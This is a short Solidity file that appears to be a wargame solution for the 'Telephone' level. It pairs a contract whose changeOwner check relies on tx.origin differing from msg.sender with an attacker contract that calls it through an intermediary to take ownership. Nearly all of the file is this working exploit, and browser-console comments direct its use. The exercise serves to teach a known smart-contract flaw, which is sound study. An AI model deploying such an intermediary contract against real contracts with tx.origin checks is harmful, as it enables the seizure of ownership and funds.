// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract MsgSenderTelephone {
    // Add your contract from the browser console 
    Telephone public noTxOrigTelephone;

    constructor(address _contract) {
        noTxOrigTelephone = Telephone(_contract);
    }

    function notTxOrigin(address _player) external {
        // Add your address to the contract from the browser console
        noTxOrigTelephone.changeOwner(_player);
    }
}